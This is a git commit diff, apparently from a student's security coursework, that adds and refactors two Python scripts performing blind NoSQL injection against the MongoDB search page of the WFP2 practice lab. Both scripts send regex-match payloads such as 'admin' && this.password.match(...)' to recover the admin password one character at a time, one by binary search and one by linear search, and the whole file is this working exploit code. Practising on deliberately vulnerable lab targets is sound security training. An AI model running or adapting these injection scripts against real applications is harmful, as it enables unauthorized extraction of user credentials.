75b60efdcd17366d4f0fa32b874560d0bbbf95d4
Thong Nguyen <thon@pdx.edu>
2020-02-05 23:04:11 -0800

    Finished

--- blindsql/blindsql.py
+++ blindsql/blindsql.py
@@ -1,54 +1,93 @@
 import requests, sys, string
 from bs4 import BeautifulSoup
 
-wfp2_site = sys.argv[1]
 
-# url = f'''http://{wfp2_site}/mongodb/example2/?search=admin' %26%26 this.password.match(/^i/)//%00'''
-url = f'''http://{wfp2_site}/mongodb/example2/?search='''
-alpha_numeric = string.ascii_letters + string.digits
+def get_request(url_to_connect):
+    """
+    Send a get request to the server and receive a response back
 
-# resp = requests.get(url)
-# soup = BeautifulSoup(resp.text, 'html.parser')
-
-# Psuedocode for list:
-# 1) Loop through every letter in alpha_numeric
-# 2) Inject every letter for every loop,
-#   2a) If 'admin' found, then letter is valid
-#       * break out of loop
-#       * include that in the URL
-# 3) Check against a regex [a-zA-Z0-9] to check if password is completed
-# Repeat steps 1-3 until checking regex [a-zA-Z0-9] returns 'admin not found'
-
-pwd = ''
-search_string = "admin' %26%26 this.password.match(/^{}{}/)//%00"
-is_completed = "admin' %26%26 this.password.match(/^{}[a-zA-Z0-9]/)//%00"
-done = False
-
-while not done:
-    for i in alpha_numeric:
-        # search_string = "admin' %26%26 this.password.match(/^" + pwd + i + "/)//%00"
-
-        resp = requests.get(url+search_string.format(pwd, i))
-        soup = BeautifulSoup(resp.text, 'html.parser')
-
-        if 'admin' in soup.find('table').getText():
-            print(url + search_string.format(pwd, i) + " Matched!")
-            pwd += i
-            print('Current pass: ', pwd)
-            break
-        else:
-            print(url + search_string.format(pwd, i) + " No match")
-
-    # check to see if password is completed
-    resp = requests.get(url + is_completed.format(pwd))
+    :param url_to_connect: (string) a link to connect to a sever
+    :return: a BeautifulSoup object
+    """
+    resp = requests.get(url_to_connect)
     soup = BeautifulSoup(resp.text, 'html.parser')
-
-    if 'admin' not in soup.find('table').getText():
-        print('Complete pass: ', pwd)
-        done = True
+    return soup
 
 
-#if ('admin' in soup.find('table').getText()):
-    # print("admin found")
-#else:
-    # print("admin not found")
+def check_user(user, soup_object):
+    """
+    To check if user exists in the table in the soup object
+
+    :param user: (string) name of user
+    :param soup_object: (object) soup object that contains table
+    :return: True if user is found in table, False if not found in table
+    """
+
+    if user in soup_object.find('table').getText():
+        return True
+    else:
+        return False
+
+
+def binary_search(alphanumeric_list, left, right, url, pwd):
+    """
+    Recursive function to perform binary search to inject SQL statements to a mongolDb database
+    This function finds a character that the password has then return that char
+
+    :param alphanumeric_list: (list) list of all the ascii letters and digits
+    :param left: (int) starting index
+    :param right: (int) ending index
+    :param url: (string) url to connect to WFP2 server
+    :param pwd: (string) already found password to be passed to the server as part of the URL's parameter
+    :return: (string) a character of password
+    """
+
+    # String that will be passed with the URL to the server
+    binary_search_string = "admin' %26%26 this.password.match(/^{}[{}]/)//%00"
+
+    # Find mid-point to cut the list of ascii characters and digits in half
+    mid = left + (right - left) // 2
+
+    # Base case for recursive function
+    if right == mid or left == mid:
+        return alphanumeric_list[mid]
+
+    soup_obj = get_request(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]))
+    # print(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]))
+
+    # Now do recursion
+    if check_user('admin', soup_obj):
+        print(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]) + " Matched!")
+        # Keep checking left if found a match
+        return binary_search(alphanumeric_list, left, mid, url, pwd)
+    else:
+        print(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]) + " No match")
+        # If no matches found in the left then check the right
+        return binary_search(alphanumeric_list, mid, right, url, pwd)
+
+
+# This is the main function, everything starts here
+def blind_sql_binary_search():
+    wfp2_site = sys.argv[1]
+    url = f'''http://{wfp2_site}/mongodb/example2/?search='''
+    alpha_numeric = string.ascii_letters + string.digits
+    pwd = ''
+    is_completed = "admin' %26%26 this.password.match(/^{}[a-zA-Z0-9]/)//%00"
+    done = False
+
+    while not done:
+        result = binary_search(alpha_numeric, 0, len(alpha_numeric) - 1, url, pwd)
+        pwd += result
+        print('Current pass: ', pwd)
+
+        # check to see if password is completed
+        soup = get_request(url + is_completed.format(pwd))
+        if not check_user('admin', soup):
+            print("Password found!")
+            done = True
+
+    return pwd
+
+
+complete_pass = blind_sql_binary_search()
+print('Complete pass: ', complete_pass)
---
+++ blindsql/blindsql_linear_search.py
@@ -0,0 +1,66 @@
+import requests, sys, string
+from bs4 import BeautifulSoup
+
+wfp2_site = sys.argv[1]
+
+url = f'''http://{wfp2_site}/mongodb/example2/?search='''
+alpha_numeric = string.ascii_letters + string.digits
+
+# Psuedocode for list:
+# 1) Loop through every letter in alpha_numeric
+# 2) Inject every letter for every loop,
+#   2a) If 'admin' found, then letter is valid
+#       * break out of loop
+#       * include that in the URL
+# 3) Check against a regex [a-zA-Z0-9] to check if password is completed
+# Repeat steps 1-3 until checking regex [a-zA-Z0-9] returns 'admin not found'
+
+
+def get_request(url_to_connect):
+    """
+    Send a get request to the server and receive a response back
+
+    :param url_to_connect: (string) a link to connect to a sever
+    :return: a BeautifulSoup object
+    """
+    resp = requests.get(url_to_connect)
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    return soup
+
+
+def check_user(user, soup_object):
+    """
+    To check if user exists in the table in the soup object
+    :param user: (string) name of user
+    :param soup_object: (object) soup object that contains table
+    :return: True if user is found in table, False if not found in table
+    """
+
+    if user in soup_object.find('table').getText():
+        return True
+    else:
+        return False
+
+
+pwd = ''
+search_string = "admin' %26%26 this.password.match(/^{}{}/)//%00"
+is_completed = "admin' %26%26 this.password.match(/^{}[a-zA-Z0-9]/)//%00"
+done = False
+
+
+while not done:
+    for i in alpha_numeric:
+        soup = get_request(url + search_string.format(pwd, i))
+        if check_user('admin', soup):
+            print(url + search_string.format(pwd, i) + " Matched!")
+            pwd += i
+            print('Current pass: ', pwd)
+            break
+        else:
+            print(url + search_string.format(pwd, i) + " No match")
+
+    # check to see if password is completed
+    soup = get_request(url + is_completed.format(pwd))
+    if not check_user('admin', soup):
+        print('Complete pass: ', pwd)
+        done = True
